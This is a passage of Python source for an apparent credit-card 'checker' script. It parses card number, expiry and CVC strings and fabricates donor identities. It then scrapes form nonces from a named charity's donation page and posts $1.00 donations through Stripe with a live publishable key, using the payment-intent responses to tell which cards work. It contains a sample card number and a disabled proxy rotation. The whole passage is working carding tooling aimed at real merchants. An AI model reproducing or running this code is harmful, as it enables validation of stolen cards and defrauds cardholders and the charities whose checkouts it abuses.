            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51igkkvagdyehlubfnxi5en0wc8t5q7yydojzfj3wgc93b2maxq0rvwwodbdgil7enl3lbx27n74ttqelkvqk5fhe00ruuiy5lp',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go14(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://arkfamilycenter.org/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G14 ID Response: {form_id}")
        print(f"G14 ID Response: {donation_nonce}")
        print(f"G14 ID Response: {campaign_id}")
        print(f"G14 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Farkfamilycenter.org&time_on_page=17988&client_attribution_metadata[client_session_id]=27b19589-078d-4328-bc15-b39f3f360a8d&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51GXY3MLASlwZcI63QqGIyDGkwkqwV9Pig9CaRgqcv7Jb5lFhaJbbeyXOl5LgdjpM5XwB7h8W7ivSU42AsjZIJKtR00RADrx9J2'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G14 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '_tccl_visitor': 'a2c6e59f-5e24-46f9-9d50-1bf6973fa5eb',
    '__stripe_mid': 'c1b02b6b-d3f0-4d03-9754-a0780c0ad663a6d971',
    '__cf_bm': 'HZzzk5.kzGvuBGyTRXF5tJM30s2CJT5uxvMByiokJTQ-1766515238-1.0.1.1-roGbgn4niRUCtrguqcAd1BrYC5qSOQL2TFUGUlGVuauJYMRLCTutR9wG9NMY_ugHBIWZi2Tw3AaDClq3MT.QXwCLbgCeI9QfTgzQ8r1_RS4',
    'charitable_session': '0eb168c08fc9cc064b6be2f8f2b3092b||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    '_tccl_visit': '8138d7dc-1e23-4a6d-aa02-07ec11bdb361',
    '__stripe_sid': 'c7fea19a-bb6d-4da6-8c97-bd768f4ac4051e0f0f',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F',
    '_scc_session': 'pc=2&C_TOUCH=2025-12-23T18:41:46.371Z',
        }
        headers = {
    'authority': 'arkfamilycenter.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_tccl_visitor=a2c6e59f-5e24-46f9-9d50-1bf6973fa5eb; __stripe_mid=c1b02b6b-d3f0-4d03-9754-a0780c0ad663a6d971; __cf_bm=HZzzk5.kzGvuBGyTRXF5tJM30s2CJT5uxvMByiokJTQ-1766515238-1.0.1.1-roGbgn4niRUCtrguqcAd1BrYC5qSOQL2TFUGUlGVuauJYMRLCTutR9wG9NMY_ugHBIWZi2Tw3AaDClq3MT.QXwCLbgCeI9QfTgzQ8r1_RS4; charitable_session=0eb168c08fc9cc064b6be2f8f2b3092b||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _tccl_visit=8138d7dc-1e23-4a6d-aa02-07ec11bdb361; __stripe_sid=c7fea19a-bb6d-4da6-8c97-bd768f4ac4051e0f0f; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F; _scc_session=pc=2&C_TOUCH=2025-12-23T18:41:46.371Z',
    'origin': 'https://arkfamilycenter.org',
    'pragma': 'no-cache',
    'referer': 'https://arkfamilycenter.org/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'Ark Family Center',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://arkfamilycenter.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51gxy3mlaslwzci63qqgiydgkwkqwv9pig9cargqcv7jb5lfhajbbeyxol5lgdjpm5xwb7h8w7ivsu42asjzijktr00radrx9j2',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
#================================        
#test_card = "5196032149064509|01|27|915"
#print(go4(test_card))
# magnicharity.org
